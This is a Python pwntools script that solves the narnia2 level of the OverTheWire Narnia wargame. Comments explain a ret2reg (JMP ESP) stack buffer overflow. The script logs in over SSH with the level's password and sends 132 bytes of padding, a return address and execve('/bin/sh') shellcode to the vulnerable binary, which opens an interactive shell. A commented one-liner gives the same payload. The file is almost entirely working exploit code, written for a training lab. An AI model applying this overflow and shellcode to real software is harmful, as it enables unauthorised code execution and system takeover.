from pwn import * 
#in the normal buffer overflow we return to an address in the NOPs until we reach the shellcode. 
#it's not a reliable technique because the stack might load differently which can cause some segfault
#some IDS can be triggered by those segfaults 
#in this case we are using a ret2reg. instead of overwriting eip with a hardcoded address on the stack we overwrite it with JMP to register where the shellcode exits.
#find a JMP ESP opcode(0xffe4) by searching in gdb with info proc map or using objdump
#memory location of JMP ESP(0xffe4) in 0xf7fc4f97
#$(python -c 'print "A"*132 + "\x97\x4f\xfc\xf7" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

user = 'narnia2'
passwd = 'nairiepecu'

s = ssh(host= 'narnia.labs.overthewire.org', user=user, password=passwd, port=2226)

s.set_working_directory('/narnia')


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
payload = ""
payload += "A" * 132
payload += p32(0xf7fc4f97)
payload += shellcode

p = s.process(['./narnia2',payload])
p.interactive()




